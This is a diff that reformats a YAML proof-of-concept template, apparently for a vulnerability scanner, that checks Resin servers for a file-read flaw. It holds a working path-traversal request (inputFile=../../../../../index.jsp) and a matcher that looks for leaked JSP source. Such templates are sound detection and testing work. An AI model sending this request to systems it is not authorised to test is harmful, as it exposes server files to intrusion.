@@ -1,11 +1,16 @@
 name: poc-yaml-resin-inputfile-fileread-or-ssrf
+manual: true
+transport: http
 rules:
-  - method: GET
-    path: /resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=../../../../../index.jsp
-    follow_redirects: false
-    expression: |
-      response.status == 200 && response.body.bcontains(bytes("<%@ page session=\"false\" import=\"com.caucho.vfs.*, com.caucho.server.webapp.*\" %>"))
+    r0:
+        request:
+            cache: true
+            method: GET
+            path: /resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=../../../../../index.jsp
+            follow_redirects: false
+        expression: response.status == 200 && response.body.bcontains(bytes("<%@ page session=\"false\" import=\"com.caucho.vfs.*, com.caucho.server.webapp.*\" %>"))
+expression: r0()
 detail:
-  author: whynot(https://github.com/notwhy)
-  links:
-    - https://www.secpulse.com/archives/496.html
+    author: whynot(https://github.com/notwhy)
+    links:
+        - https://www.secpulse.com/archives/496.html
